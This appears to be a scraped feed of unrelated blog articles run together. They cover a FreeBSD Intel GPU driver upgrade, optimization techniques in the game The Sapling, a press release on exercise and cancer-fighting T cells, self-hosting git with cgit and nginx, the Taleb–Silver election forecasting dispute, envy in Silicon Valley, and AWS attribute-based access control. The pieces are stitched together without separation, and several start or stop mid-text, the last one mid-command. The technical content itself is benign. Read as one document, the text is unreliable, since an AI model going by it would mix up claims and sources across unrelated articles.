<p>Fortunately there is a meta-port called <code>drm-fbsd12.0-kmod</code> (which also works on 12.2 it seems) which installs a newer <code>i915kms.ko</code> which supports the GPU. Since building the driver requires kernel sources it is not available from the official FreeBSD package builders, and since I needed to upgrade anyway I started a <code>buildworld</code> with the following beauty of a oneliner (run as root, not with sudo): <code>time (make -j$(sysctl -n hw.ncpu) buildworld &amp;&amp; make -j$(sysctl -n hw.ncpu) kernel &amp;&amp; mergemaster -pFUi &amp;&amp; make installworld &amp;&amp; mergemaster -FUi &amp;&amp; make BATCH_DELETE_OLD_FILES=yes delete-old &amp;&amp; make BATCH_DELETE_OLD_FILES=yes delete-old-libs) &amp;&amp; date</code>. Note that a reboot before the first <code>mergemaster</code> is recommended, but for small upgrades I usually don't bother. If <code>installworld</code> fails with weird errors try again after a reboot :)</p>

<p>Including a few minutes for some <code>mergemaster</code> fun near the end it took just 59 minutes before I had a newly built world and kernel. Then I could build the driver from ports, and add the line <code>kld_list="boot/modules/i915kms.ko"</code> to <code>/etc/rc.conf</code> and reboot. After the reboot X started with no issues at all. For reference this is a <code>dmesg(8)</code> from the NUC after the new driver was enabled (I've highlighed the GPU related stuff):</p>

<div id="label_bar"><p>Announcement</p><p>Technical</p><p>Graphics</p><p>Music</p></div>
<p id="first_p">A major point of feedback for evolution simulator The Sapling is that the players wanted larger levels. To make this possible, I spent three months optimizing the underlying game engine. This article is an in-depth explanation of one of the main insights I had. There are several interactive simulations you can play with in your browser to get a deeper understanding of how everything works.</p>
<p><span id="first_character">T</span>he first major update for The Sapling, the flower update, was released in September. It adds pollination, flowers (obviously), a new scenario, a complete overhaul of the sandbox level, bioluminescence and much more. A number of scenes from the trailer:</p>
<video width="320" loop="" autoplay="" muted="">
  <source src="https://thesaplinggame.com/devlogs/optimization/flower_highlights.mp4" type="video/mp4">
</video>

<p>Importantly, it addresses a major point of feedback that kept coming back: players wanted more space for their creations to grow and evolve. I couldn't easily make the levels larger, however, because the game already had performance problems in the smaller levels and with each new spot where organisms could live this would get worse exponentially. The hard part is that there are not one, but two computationally heavy things going on at the same time: simulating an ecosystem where hundreds of organisms are all doing their own things (moving, eating, reproducing, mutating) AND visualizing these hundreds of objects. With larger levels, this would be thousands, essentially bringing the game to a halt with 1 frame per 5 seconds (FPS) instead of the regular 60 per 1 second. </p>
<p>Besides my obvious desire to please the players, having larger levels was also crucial for my own ambitions with the game, because a number of the simulation mechanics didn't really work with the smaller maps; for example, why evolve an instinct to run away from a predator if you have nowhere to go? Or for plants, why evolve things like bark or high leaves if the biggest reason that your offspring is dying is because all seeds are landing on spots that are already taken? In nearly 100% of the cases, all plants evolved to do was getting as much offspring as possible, in the hopes that at least one of them by accident landed in a spot that was free.</p>
<p>In other words, if there was going to be one major feature in the first big update, it should be larger maps. To make this possible, I spent 3 months in the beginning of 2020 with that one focus: optimize, optimize, optimize the game's code, so I could get that FPS up and shave off more of the milliseconds it takes to render a scene. It was frustrating at times, but the main feeling I remember was actually excitement, as this really forced me to investigate the major bottlenecks (when I close my eyes, I can still see the Unity profiler), and come up with several new creative solutions for them. During this period I was reading a book about how John Carmack, the brilliant programmer behind the first Doom engine, was doing endless optimizations to make first person shooters a reality in the 90s, which was a great help in keeping me motivated.</p>
<p>While I implemented all kinds of larger and smaller ideas that made significant positive contributions to the performance of the game, there is one insight that had the biggest impact for the visualization part of the problem (how do you show thousands of unique organisms on screen?), which is to <strong>fake it before you make it</strong>. Let's go through my thought process step by step to see what I mean by that in this context. For every step, there is an interactive simulation you can run in your browser, so you can play with the idea yourself.</p>
<h2>Step 1: the raw, unoptimized goal</h2>
<p>This is the basic idea, without any optimization: players can add their self created species somewhere in the world, and see whether it is strong enough to survive. In the interactive example below, you can add two species, 1 and 2, and then run the simulation. </p>








<p>The simulation and subsequent visualization should be instant in your browser, but this is of course a 2D table with precreated images. When we have to create fully animated 3D models in a 3D world instead, it quickly becomes too much. </p>
<hr>
<p>The main problem is that building an organism in 3D is expensive.</p>
<hr>
<p>The main problem is that <strong>building/visualizing an organism in 3D is expensive</strong>. While I have done major rewrites of the code that builds plants and animals, mostly focusing on not doing things twice and skipping parts of the procedure that are not 100% necessary (like building the roots of plants that are underground anyway), creating new organisms from scratch remained, and still is, expensive.</p>
<h2>Step 2: object pooling</h2>
<p>The textbook solution when a lot of objects need to be created and removed in a game is to use object pooling. The idea is that when an object dies (in The Sapling, quite literally), the game object is not destroyed but reincarnates as the next object that is created, instantly moving to the position of the newborn organism and resetting any animations it was showing. That is, you think you are looking at a large amount of objects being created and destroyed again, but in reality you are looking at a smaller amount of objects that are just changing locations quickly.</p>
<p>In the interactive example below, I have added a pool to the right. When plants die, their models are either immediately reused or are stored in the pool until they are needed again, so a lot less 3D models need to be created. Comparing this simulation to the one above, the difference becomes clear when you skip 10 days a few times; in the first simulation, the model identifier (the part below each plant were it says 'model 10', for example) gets higher and higher, while here it stays low, reflecting the small number of 3D models that needed to be created.</p>




<p>Object pooling greatly improves the FPS in a stable ecosystem, as you can simply reuse what you already have and there is no need to create new objects on the fly. Unfortunately, in practice ecosystems in the game are very frequently unstable, most notably in the beginning of every new scenario when there is empty land to colonize. In other words, an object pool is not going to help if that pool is empty... so we'll also need a faster way to fill it.</p>
<h2>Step 3: prebuilt organism library</h2>
<p>So far, when a plant was not available in the pool, we built it from scratch. If we are building a 3D model that we have built before, however, this is not necessary: why not store an example somewhere and just copy it? This is more expensive than taking an object from the pool, but way cheaper than building it from scratch. In the current example, there is a limited number of species (species 1 and species 2), so that would mean we only have to build a 3D model two times, and then be done with it.</p>




<p>At this point, we will get an acceptable FPS in an ecosystem with a small number of species, and no variation within a species... which is actually the case during the scenarios! In the sandbox mode, however, there is a <em>random mutations mode</em> that has a 30% chance of introducing a random change to a newborn plant or animal; that is, for 1 out of 3 newborn plants we won't have anything in the object pool AND the prebuilt organism library, so we're back to building from scratch.</p>
<h2>Step 4: faking it and showing ancestors instead</h2>
<p>I came up with this final step when actually playing around with the (then still sluggish) random mutations mode in larger levels. The main insight is that in random mutations mode the player has no idea of what something is supposed to look like. For example, if a new plant is a little taller than its ancestors, but this is not shown to the player, will the player ever know? Almost certainly not, in particular if you take into account that the player is often looking at hundreds of plants and animals simultaneously. On the other hand, will the player notice performance problems? Yes, for sure... so a 100% smooth experience should get a higher priority than a 100% accurate visualization.</p>
<hr>
<p>The player has no idea of what something is supposed to look like</p>
<hr>
<p>In practice, this means that if random mutation leads to a completely new organism, the game will not automatically build it from scratch, even though it is not in the pool or the library. Instead, it will look at what was shown for the parent and show this as a substitute. Later, when the game has time to breathe, the missing model might be added to the library. The game keeps track which organisms have a 'fake' appearance, and I can vary in how fast gaps in the library should be closed. Right now, I have settled on building a maximum of 1 organism per second. </p>
<p>In the simulation below, random mutations are turned on for the first time. This means that after some time you will not only see plants like the ones you added yourself (species 1 and species 2); instead, the number will go up each time a newborn plants changes a little bit from its parent, so after some time you will see species 3, species 4, species 5, etc. The accompanying model, however, will NOT change, meaning that the real plant and its 3D model go out of sync; the name will turn orange if this is the case. So you might see the model of a plant 1, while the text in orange tells you it is actually a plant 3. To catch up, you have to click the 'Add 1 model to library' button.</p>




<p>And this way, we have scaled back from building hundreds of 3D models per second to just one! Of course, there are a number of details, quirks and edge cases that I have left out of the explanation above to keep things simple. Two of them I want to mention to give you a more complete idea of the problem:</p>
<ul>
<li>In the simulation above, whenever you create a new 3D model, it's just the next one in line. In the real game, I'm trying to do this smarter by looking at which organisms are visually the most different from the 3D model they are using. That is, an animal that evolved an extra pair of feet is way more likely to get its model updated than a plant that evolved deeper underground roots.</li>
<li>When you leave the simulation running for a longer …</li></ul></div></div></div>

            <p>Prior research has shown that physical activity can prevent unhealth as well as improve the prognosis of several diseases including various forms of cancer. Exactly how exercise exerts its protective effects against cancer is, however, still unknown, especially when it comes to the biological mechanisms. One plausible explanation is that physical activity activates the immune system and thereby bolsters the body’s ability to prevent and inhibit cancer growth.</p>

<p>In this study, researchers at Karolinska Institutet expanded on this hypothesis by examining how the immune system’s cytotoxic T cells, that is white blood cells specialized in killing cancer cells, respond to exercise.</p>

<h2>Cancer growth slowed in trained animals</h2>

<p>They divided mice with cancer into two groups and let one group exercise regularly in a spinning wheel while the other remained inactive. The result showed that cancer growth slowed and mortality decreased in the trained animals compared with the untrained.</p>

<p>Next, the researchers examined the importance of cytotoxic T cells by injecting antibodies that remove these T cells in both trained and untrained mice. The antibodies knocked out the positive effect of exercise on both cancer growth and survival, which according to the researchers demonstrates the significance of these T cells for exercise-induced suppression of cancer.</p>

<p>The researchers also transferred cytotoxic T cells from trained to untrained mice with tumors, which improved their prospects compared with those who got cells from untrained animals.</p>

<h2>Exercise altered T cell metabolism</h2>

<p>To examine how exercise influenced cancer growth, the researchers isolated T cells, blood and tissue samples after a training sessions and measured levels of common metabolites that are produced in muscle and excreted into plasma at high levels during exertion. Some of these metabolites, such as lactate, altered the metabolism of the T cells and increased their activity. The researchers also found that T cells isolated from an exercised animal showed an altered metabolism compared to T cells from resting animals.</p>

<p>In addition, the researchers examined how these metabolites change in response to exercise in humans. They took blood samples from eight healthy men after 30 minutes of intense cycling and noticed that the same training-induced metabolites were released in humans.</p>

<p>“Our research shows that exercise affects the production of several molecules and metabolites that activate cancer-fighting immune cells and thereby inhibit cancer growth,” says <a href="https://staff.ki.se/people/helame">Helene Rundqvist</a>, senior researcher at the <a href="https://ki.se/en/labmed/department-of-laboratory-medicine">Department of Laboratory Medicine</a>, Karolinska Institutet, and the study’s first author. “We hope these results may contribute to a deeper understanding of how our lifestyle impacts our immune system and inform the development of new immunotherapies against cancer.”</p>

<p>The researchers have received financing from the Knut and Alice Wallenberg Foundation, the Swedish Research Council, the Swedish Cancer Society, the Swedish Childhood Cancer Foundation, the Swedish Society of Medicine, Cancer Research UK and the Wellcome Trust.</p>

<p><em>Mar 31, 2018</em></p>
<p>Hosting git repos on your own server is actually quite easy.
Login to the server, create a new directory, and initialize a bare repo:</p>
<pre><code>mkdir foo.git
cd foo.git
git init --bare
</code></pre>

<p>That's it! Now, from the client, clone this repo with:</p>
<pre><code>git clone username@example.com:path/to/foo.git
</code></pre>

<p>Having a dedicated user for git repos on the server makes it easier share access to the repo.
Create a new user <code>git</code> with a login shell restricted to git commands:</p>
<pre><code>sudo adduser --shell $(which git-shell) git
</code></pre>

<p>Now create a repo in the home directory of the <code>git</code> user:</p>
<pre><code>cd /home/git
sudo -u git mkdir bar.git
cd bar.git
sudo -u git git init --bare
</code></pre>

<p>As before, clone the new repo from the client using:</p>
<pre><code>git clone git@example.com:bar
</code></pre>

<h2>Backup the repos</h2>
<p>This is my script to take daily backups of all the git repos on the server to Amazon S3.</p>
<pre><code>#!/bin/bash

set -e

GITDIR=/home/git
TMPDIR=/tmp/gitbackup

renice -n 15 $$

trap "rm -f /tmp/gitbackup/*.git.tar.gz" EXIT

mkdir -p ${TMPDIR}
cd ${TMPDIR}

for proj in ${GITDIR}/*.git; do
    base=$(basename $proj)
    tar -C $GITDIR -zcf ${base}.tar.gz $base
done

export AWS_ACCESS_KEY_ID=xxxxx
export AWS_SECRET_ACCESS_KEY=yyyyy
export AWS_DEFAULT_REGION=us-west-2

aws s3 cp ${TMPDIR}/*.git.tar.gz s3://mygitbucket/
</code></pre>

<p>If the repos are large, it might be worthwhile checking whether
the hash of the gzipped repo has changed before uploading.
It's also good idea to use <code>envdir</code> to manage the access keys rather
than putting them in the backup script.</p>
<h2>Web front-end using cgit and nginx</h2>
<p>Sometimes it's useful to view source code and commits on a
web browser. <code>cgit</code> is an awesome light-weight webapp for this.
Unlike heavy apps like GitLab, <code>cgit</code> needs no database, which
reduces the administrative burden.</p>
<p>Install cgit, nginx, fcgiwrap, and apache-tools (to create a <code>.htpasswd</code> file).</p>
<pre><code>sudo apt install cgit nginx fcgiwrap apache2-utils
</code></pre>

<p>Specify the location of the git repos and static assets in the 
<code>cgit</code> config at <code>/etc/cgitrc</code>.</p>
<pre><code>css=/cgit-static/cgit.css
logo=/cgit-static/cgit.png
favicon=/cgit-static/favicon.ico

#source-filter=/usr/lib/cgit/filters/syntax-highlighting.py

scan-path=/home/git/
</code></pre>

<p>To get syntax highlighting, install <code>python-pygments</code> and uncomment the source-filter option.</p>
<p>If you'd like to password protect access to <code>www.example.com/git/</code>, create a <code>.htpasswd</code> file:</p>
<pre><code>sudo htpasswd /etc/nginx/.htpasswd &lt;username&gt;
</code></pre>

<p>This is my <code>nginx</code> conf file to serve <code>cgit</code> from <code>www.example.com/git/</code>.</p>
<pre><code>server {
    listen 80;
    listen [::]:80;

    server_name www.example.com;

    location /.well-known/acme-challenge/ {
        root /var/www/www.example.com;
    }
    location / {
        return 301 https://www.example.com$request_uri;
    }
}

server {
    listen 443 ssl;
    listen [::]:443 ssl;

    server_name www.example.com;

    ssl_certificate /etc/letsencrypt/live/www.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/www.example.com/privkey.pem;

    location /cgit-static/ {
        alias /usr/share/cgit/;
    }

    location /cgit/ {
        auth_basic "Restricted";
        auth_basic_user_file /etc/nginx/.htpasswd;

        include fastcgi_params;
        fastcgi_split_path_info ^(/cgit)(.*)$;
        fastcgi_param   PATH_INFO        $fastcgi_path_info;
        fastcgi_param   SCRIPT_FILENAME  /usr/lib/cgit/cgit.cgi;
        fastcgi_param   QUERY_STRING     $args;
        fastcgi_param   HTTP_HOST        $server_name;
        fastcgi_pass    unix:/var/run/fcgiwrap.socket;
    }

    location / {
        root /var/www/www.example.com;
    }
}
</code></pre>

<p>You might also want to restrict repo access to only whitelisted IPs.</p>

<p>Perhaps lost in the whirlwind of presidential name-calling, a lesser-known multi-year old feud has resurfaced on Twitter this election season. Nate Silver is the founder of <a href="https://fivethirtyeight.com/">FiveThirtyEight</a> and is a popular statistician frequently called upon by media members to give commentary and expertise on election forecasting. Nassim Taleb is a statistician/quant turned philosopher, perhaps most well known for authoring the book “The Black Swan”. He is second most well known for calling people names on Twitter. In this 2018 instance he seemed to take issue with FiveThirtyEight’s election forecasts, saying that <a href="https://twitter.com/nntaleb/status/1059202026184282113">“klueless Nate Silver” “doesn’t know how math works”</a>, among a host of other insults. Silver responded that Taleb was an <a href="https://twitter.com/NateSilver538/status/1062782704159256576">“intellectual-yet-idiot”</a>, an phrase coined by Taleb himself. Ouch. A litany of statisticans, mathematicians, and data scientists came out of the woodwork to take sides. Taleb himself <a href="https://twitter.com/nntaleb/status/1314902682570764288">doubled down</a> on Oct. 10, 2020, again calling Silver “totally clueless”.</p>

<p>In this article I take a look behind the mathematical premises of Taleb’s arguments, and give intuitive explanations of why or why not they hold up. In short, while Taleb’s math is sound, he still manages to miss the mark by ignoring the nuance of Silver’s forecasts.</p>

<p>Taleb’s main gripe is that forecasters change their opinion too much over time. Take a look at FiveThirtyEight’s forecast from the 2016 presidential election, where the probability of Clinton winning peaked at 90%, and hit a low of 50%. 
<img src="http://quant.am/assets/2016election.png" alt="2016 election"></p>

<p>Taleb insists that Clinton never should’ve received a probability of winning of 90%. Even if polls were heavily in favor of Clinton at the time, he says Silver should’ve taken into account the uncertainty that polls would change over the next few months leading up to the election, or the possibility of major news breaking. If Silver had factored in the “unknown unknowns” his forecast should’ve been closer to 50%. In essence, this single number should reflect all <em>current and future uncertainty</em>. Taleb constructs this argument by way of quantitative finance, which perhaps led to him and traditional statisticians talking past each other. In the following sections I step through his argument in intuitive terms.</p>


<p>A well known truth to economists, quants, and traders: if I tell you a number, I must be willing to transact at that number. If I tell you the fair value of this house is $500,000, I must be willing to buy AND sell at that price. Otherwise, the number I gave you is meaningless. Likewise, if I tell you the probability of Biden winning this election is 73%, I must be willing to pay $0.73 to make the following wager: if Biden wins I receive $1, if he loses I receive $0.</p>

<p>This is important because it turns the predicted probabilities into a tradeable financial instrument known as a binary option. If the prediction is 50%, I can buy the option at $0.50. If the prediction moves to 65%, I can now sell the option at $0.65, turning a $0.15 profit.</p>

<p>This brings us to another important principle known as the <em>no-arbitrage condition</em>. If the election predictions are accurate, there should be no way for a trader to make guaranteed money by trading this option. To give an illustrative example, let’s say that we live in an unchanging world where the probability of Candidate A winning is static at 50%. If a pollster does not report a static forecast day after day, he will create an arbitrage opportunity. We will sell when the prediction is above 50%, and buy below. 
<img src="http://quant.am/assets/arbitrage-pollster.jpeg" alt="Arbitrage condition"></p>

<p>OK, so now we’ve established that if an arbitrage condition exists, then the pollster is wrong and should not have made that prediction in the first place. Still, it’s not obvious that there’s an arbitrage condition within Silver’s predictions yet (remember, the trader doesn’t have access to an oracle, and only has the same information available to him as the pollster). There’s two more building blocks that we need in order to establish an arbitrage condition.</p>


<p>To paraphrase Taleb, if I tell you an event has a 0% chance of occurring, I cannot change my mind and tell you tomorrow it now has a 50% chance of occurring. Otherwise I shouldn’t have told you it has a 0% chance in the first place. Probability and confidence are inextricably linked, and the number a pollster predicts should encapsulate both. To go to the other extreme, if the uncertainty is extremely high (and therefore confidence low), <em>it does not matter what the polls today are saying</em>. I should give both candidates a 50% chance of winning, because I am admitting the extremely likely possibility that an external event will happen that will invalidate today’s polls. To put it in technical terms, maximum uncertainty implies maximum entropy, and the maximum entropy distribution on the [0, 1] interval is the uniform distribution, which has a mean at .5. The following figure (from <a href="https://arxiv.org/pdf/1703.06351.pdf">this paper</a>) shows the relationship between probability (x-axis) and volatility (y-axis) under a specific option pricing formulation.
<img src="http://quant.am/assets/confidence-probability.png" alt="Confidence vs volatility"></p>

<p>At this point we are suspecting something doesn’t look right with FiveThirtyEight’s predictions, as they seem to have both high volatility and high probability, which contradict each other. Where is the threshold though? How can we prove that the volatility is too high?</p>


<p>Now we’re going to go a little bit technical and show that a no-arbitrage condition was likely violated. The basic construction is as follows:</p>

<ol>
  <li>In order to satisfy the no-arbitrage condition, all information must be “priced in” into the pollster’s current prediction.</li>
  <li>Therefore, the time series of predictions must be a martingale.</li>
  <li>Martingales cannot show trending or mean-reverting behavior, therefore Silver’s predictions violated the martingale property, and therefore the no-arbitrage condition.</li>
</ol>

<p>The definition of a martingale is a stochastic process \(X_1, X_2, ... X_t\) that satisfies</p><p>

\[E[X_{t+1} | X_1, ... ,X_t] = X_t\]

</p><p>To quote <a href="https://www.researchgate.net/profile/Christopher_Wlezien/publication/344419648_Information_incentives_and_goals_in_election_forecasts/links/5f73c994a6fdcc0086484861/Information-incentives-and-goals-in-election-forecasts.pdf">Andrew Gelman</a>,</p>

<blockquote>
  <p>In non-technical terms, the martingale property says that knowledge of the past will be of no use in predicting the future…One implication of this is
that it should be unlikely for forecast probabilities to change too much during the campaign (Taleb, 2017). Big events can still lead to big changes in the forecast: for example, a series of polls with Biden or Trump doing much better than before will translate into an inference that public opinion has shifted in that candidate’s favor. The point of the martingale property is not that this cannot happen, but that the possibility of such shifts should be anticipated in the model, to an amount corresponding to their prior probability. If large opinion shifts are allowed with high probability, then there should be a correspondingly wide uncertainty in the vote share forecast a few months before the election, which in turn will lead to win probabilities closer to 50%.</p>
</blockquote>

<p>In other words, all information is already priced into the current market. If it were not so, a trader could make money by taking advantage of the information that is not priced in already. So last thing we need to check: is it likely that Silver’s predictions have the martingale property? It is not in dispute that the answer is no…it shows clear mean-reversion behavior and can be validated by a statistical test of the martingale hypothesis (for example, a <a href="http://www.planchet.net/EXT/ISFA/1226.nsf/9c8e3fd4d8874d60c1257052003eced6/35822efeb009804cc1257afe006b0063/$FILE/11park.pdf">Kolmogorov-Smirnov test</a>). It seems that Taleb’s math is sound here. So where did he go wrong?</p>


<p>I believe Nate Silver is answering a subtly different question with his election forecasts. Each data point that Silver produces is answering the question: <em>if the election were to happen today</em>, what is the probability of each candidate winning? I argue that this is a valid and useful formulation. To put it slightly differently: if the question is “Who will win the election on Nov. 3?”, which of the following answers is more satisfying?</p>

<ul>
  <li>“If nothing else changes between now and the election, Joe Biden has a 85% chance of winning.” (Silver’s argument)</li>
  <li>“I dunno, anything could happen between now and the election, I give neither candidate chances much more than 50%.” (Taleb’s argument)</li>
</ul>

<p>It is a valid criticism that perhaps Silver is not very clear on explaining what his numbers represent, and therefore the media misreports his predictions. Still, I wager that most people would find the first answer more useful. In this interpretation, the “financial instrument” is a binary option that expires every day. Thefore the time series of Silver’s predictions is not interpretable as a martingale, as it strings together the price of a completely different instrument every day.</p>

<p>It is also a valid criticism that Silver’s predictions prior to Nov. 3 mean absolutely nothing, whereas in the Taleb formulation it has a natural interpretation as the betting odds for each candidate. Silver has explicitly stated that he only judges his models based on his finalized prediction. To that end, his models are extremely well calibrated, i.e., when he says something has a 50% chance of happening it actually does happen 50% of the time.
<img src="http://quant.am/assets/538-calibration.png" alt="538 calibration"></p>

<p>In conclusion, Taleb and Silver should be having a philosophical debate on what pollsters’ numbers actually mean, and stay away from the useless distraction of calling each other names on Twitter.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Silicon Valley runs on envy. Envy pervades every activity here. Funding announcements, company off-sites, career promotions, introduction emails, product releases, investor pitches, board meetings, fireside chats, news stories-- all are infused with envy. Envy is the fuel that animates this place, the scaffolding that holds it upright, and the glue that keeps it together. If you could cast a spell to eliminate envy, every Silicon Valley institution would deflate and vanish, like an alien goo-monster cut off from its power source in pre-CGI horror movies.</p><p>Envy is at every step in the funnel. Founders without funding envy founders with funding. Founders with funding envy founders with funding from more prestigious investors. Founders with funding from prestigious investors envy founders who are favorites. Founders of companies with a $30B market cap envy founders of companies with a $300B market cap. VC associates envy junior partners, who envy senior partners. Investors envy other investors who have better deal flow. Tech employees envy other tech employees who get to spend more time with the senior leadership. Get a drink in a product manager, and they’ll tell you all about how the CEO plays favorites. Everyone watches each other as if it's their full time job.</p><p>I was once having a drink with a YC founder whose company was in the top ten by valuation in the YC portfolio. For a while, he was getting invited to dinners exclusive to founders in their top ten most valuable companies. Then, other companies dramatically grew in valuation, and his was pushed down the list far past the top ten. He was telling me how he envied founders who got to attend these dinners he wasn't invited to anymore. And of course I envied him because at least he got to go.</p><p>You do not talk about envy in polite company. That would puncture through a collectively agreed-upon veneer. But envy is such an important mechanism, we must talk about it. So we repackaged it as status. Envy and status aren't the same, but it doesn't matter because there are very few low-status people who don't experience envy. This linguistic trick transposes a Judeo-Christian idea into an amoral domain. It works. We can’t talk about envy, but we can safely talk about status, so long as it's in the abstract and not about a particular person.</p><p>Envy is contagious. I don't think I've ever experienced it unless I'm in an environment where I sense it from others. Then, if I'm not careful, I feel it very intensely. It's such an unpleasant sensation that I deliberately go out of my way to avoid it. The best way to avoid feeling envy is to spend time with aspy people who are unable to feel it, or with people who've accepted their lot in life. Conversely anything tech scene is a breeding ground for envy (e.g. tech press, gossip, startup parties, exclusive events). Repeatedly choosing to put yourself into situations where you feel envy has the same shape as an abusive relationship. It isn't good for you, but you keep coming back because you're too myopic to see it for what it is.</p><p>Dislike for the unpleasant sensation of being envious isn't a good reason for envy avoidance. A much better reason is that in a technologically sophisticated civilization envy is a bad north star. Consider again what you pay attention to when you adopt envy as your guide. Tech press, gossip, parties, off-sites-- almost all of it is noise, and is therefore a monumental waste of your time. And it makes you hyperactive. You become like a confused moth, abruptly changing course to follow rapidly flashing sources of light, except you aren't aware they're going on and off at random.</p><p>Conviction is a dramatically better north star than envy. It's important to meet people, but it's much better done by working toward a shared mission than by trying to wriggle your way into desirable social circles. The mission can be enormous (get to Mars) or mundane (complete a multi-day hike). Human beings form the strongest bonds when they overcome shared obstacles in pursuit of a common goal. And even if people don't join you, they are likely to remember you and respect you for attempting to accomplish a challenging mission. </p><p>Envy is a paradoxical emotion because it makes you desire things you'd be much more likely to get if you rarely felt it, or at least rarely acted on it. So if you want to acquire the objects of your envy, structure your life to avoid it as much as possible. That isn't to say envy isn't useful. Silicon Valley is built on envy, and it has accrued immense advantages-- capital, talent, networks, collective wisdom. Harness the envy of others to achieve your mission. Don’t allow others to ignite envy in you to achieve theirs.</p><p><strong>TL;DR:</strong> Spend time with people who don't feel envy. Avoid people who do. Pick a mission, and direct all your energy into solving problems that stand between you and your target. Nurture relationships by overcoming shared challenges with others. Avoid "the scene". If you were a musician, you'd want to be the type who's practicing scales rather than trying to get backstage to party with the rock stars. Find the equivalent of practicing scales in your field, and do that.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>Two years ago, in November 2018, AWS <a href="https://aws.amazon.com/blogs/security/add-tags-to-manage-your-aws-iam-users-and-roles/">announced</a> new conditions keys <code>aws:PrincipalTag</code> and <code>aws:RequestTag</code>, and <a href="https://aws.amazon.com/blogs/security/simplify-granting-access-to-your-aws-resources-by-using-tags-on-aws-iam-users-and-roles/">started to push</a> the concept of Attribute Based Access Control (ABAC).  This post will describe what this is, the difficulties with implementing this strategy, and what AWS needs to do for customers to be successful with this concept.</p>


<p>A long standing problem with AWS security has been that if you had two projects in a single AWS account, it was often impossible to ensure that some principals (meaning the users and roles there) could only interact with the resources of one project and not the other.  In order to implement a least privilege strategy, you want to isolate the actions each principal can take to only certain resources to ensure they cannot impact or exfil data from the other project.</p>

<p>The solution many customers have been forced to adopt is to isolate their projects into separate AWS accounts, but that’s not always ideal. For example, it can be difficult to take an existing account and move resources into another account as an account grows.  So AWS started focusing on tagging resources and restricting access via tags.  Over time, many privileges started to be able to work with the condition key <code>aws:ResourceTag</code> so that you could restrict who could interact with an existing resource. But what if you wanted the principal to create new resources, but restrict what tags they could use, so they couldn’t create a resource with the tag of another project?  For this AWS <a href="https://aws.amazon.com/blogs/security/add-tags-to-manage-your-aws-iam-users-and-roles/">released</a> <code>aws:RequestTag</code>.</p>

<p>What if you had many principals and projects and you didn’t want to create separate IAM policies for each one? You want a single policy that you can apply to all principals that says “Only interact with resources that match the same tag as you have” or the common request of “You can only interact with resources you created.”  To implement this concept, AWS released <code>aws:PrincipalTag</code>, so you could now use a conditions such as:</p>

<pre><code>StringEquals: { "aws:RequestTag/project": "${aws:PrincipalTag/project}" }
</code></pre>

<p>Attribute-based access control (ABAC) is an authorization strategy that defines permissions based on attributes, which on AWS means tags.

<p>The first issue people ran into with ABAC was that not all resources supported tags. Of those resources that did, not all supported IAM conditions to restrict these tags. Of those that did, not all supported tag on create, so you could only restrict access to tag existing resources, leaving resources untagged.  Let’s get some stats on how much coverage AWS has today.  Using the IAM data from <a href="https://github.com/duo-labs/parliament/blob/main/parliament/iam_definition.json">Parliament</a> (which is just the AWS <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_actions-resources-contextkeys.html">docs</a> scraped into a json file), we find there are 869 privileges that contain the word <code>create</code>, which we can assume to be the privileges that grant permission to create a resource.</p>

<pre><code>$ cat parliament/iam_definition.json | jq '.[]|.prefix as $prefix|.privileges[]|.privilege as $privilege|select($privilege|ascii_downcase|contains("create"))|$prefix+":"+$privilege'  | sort | uniq | wc -l
     869
</code></pre>

<p>Next, we’ll find all the privileges of these that allow the <code>RequestTag</code> condition key:</p>

<pre><code>$ cat parliament/iam_definition.json | jq '.[]|.prefix as $prefix|.privileges[]|.privilege as $privilege|select($privilege|ascii_downcase|contains("create")).resource_types[].condition_keys[]|select(.|ascii_downcase |contains("requesttag"))|$prefix+":"+$privilege' | sort | uniq | wc -l
     381
</code></pre>

<p>We find that 381 of 869 (43%) privileges for creating resources on AWS allows you to both tag the new resources and to restrict what tags are used for that.  This search does miss some privileges that are used to create resources but do not include the word <code>create</code>, such as <code>ec2:RunInstances</code> that lets you create an EC2 and <code>route53:ChangeResourceRecordSets</code> that lets you create a subdomain.  It also misses situations where AWS has two privileges for creating a resource, where one privilege is used for creating the resource with tags and one without, such as <code>cloudfront:CreateDistribution</code> and <code>cloudfront:CreateDistributionWithTags</code>.  However, 43% seems roughly correct.</p>

<p>One might try to argue that the more widely used resources do support tag on create and restricting those tags, but there are some popular resources that do not.  For example, the following privileges are all unable to restrict tag on create: <code>lambda:CreateFunction</code>, <code>dynamodb:CreateTable</code>, <code>kms:CreateKey</code>, <code>logs:CreateLogGroup</code>, <code>s3:CreateBucket</code>, <code>sqs:CreateQueue"</code>, and <code>iam:CreateRole</code>.</p>

<p>As a hack, for resources that don’t support tag on create, you can use the names of the resources in a similar way as a tag, but this is awkward.</p>


<p>Given a resource in an AWS account, there is not much tooling available that can tell you who all has access to it.  Some tools (ex. <a href="https://github.com/FSecureLABS/awspx">awspx</a>) will tell you who has certain privileges, but they don’t understand conditions, among other details.  So for example, they can tell you who has <code>secretsmanager:CreateSecret</code>, but they won’t tell you who can create a secret with the tag <code>foo</code>.</p>

<p>I built some functionality into <a href="https://github.com/duo-labs/cloudmapper">CloudMapper</a> through it’s <code>access_check</code> command that tries to understand more IAM logic. It has some understanding of conditions and will also take IAM Boundaries into consideration, but it does not understand the existing tags on a resource, and lacks a lot of other functionality.  Its answers will be more correct than other tools for some questions, but will still be incorrect for a lot of cases.  The project <a href="https://github.com/nccgroup/PMapper">PMapper</a> also has some additional logic in it.</p>

<h3 id="simulateprincipalpolicy">SimulatePrincipalPolicy</h3>
<p>There is an API called <a href="https://docs.aws.amazon.com/IAM/latest/APIReference/API_SimulatePrincipalPolicy.html">SimulatePrincipalPolicy</a> that can be used to understand who has access to resources, but it is missing a lot of functionality you would expect.  For example, you can pass it the ARN of a principal, the ARN of a resource, and associated privilege to check for, but if there are any conditions, you then have to also include the condition values that should be used when checking this.  This means you have to figure out the tags of the resource and the resource policy to then pass to this call.</p>

<p>So for example, assume we have a principal that can call <code>secretsmanager:GetSecretValue</code> only on secrets that have been tagged with a <code>project</code> key that has a value <code>foo</code>, and we have a secret with that tag.  In order to check if our principal can access this secret, we can run:</p>

<pre><code>aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456789012:user/testuser \
  --action-names secretsmanager:getsecretvalue \
